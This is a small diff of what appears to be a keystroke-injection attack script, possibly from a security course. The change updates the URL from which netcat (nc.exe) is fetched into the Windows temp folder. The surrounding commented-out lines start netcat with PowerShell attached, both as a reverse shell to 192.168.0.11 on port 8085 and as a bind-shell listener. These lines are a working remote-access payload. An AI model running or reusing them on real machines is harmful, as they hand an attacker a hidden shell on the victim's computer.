@@ -21,7 +21,7 @@ exit
 ::REM ::REM $desktop = [Environment]::GetFolderPath('desktop')
 ::REM ::REM cd $desktop
 ::REM cd $env:TEMP
-::REM wget 'https://www.cse.unsw.edu.au/~z3419746/nc.exe' -OutFile nc.exe
+::REM wget 'https://www.cse.unsw.edu.au/~z3419746/6841/nc.exe' -OutFile nc.exe
 ::REM ::DELAY 4000
 ::REM start-process nc.exe '192.168.0.11 8085 -e powershell.exe -d'; exit
 ::REM start-process nc.exe '-lp 8085 -e powershell.exe -d'; exit
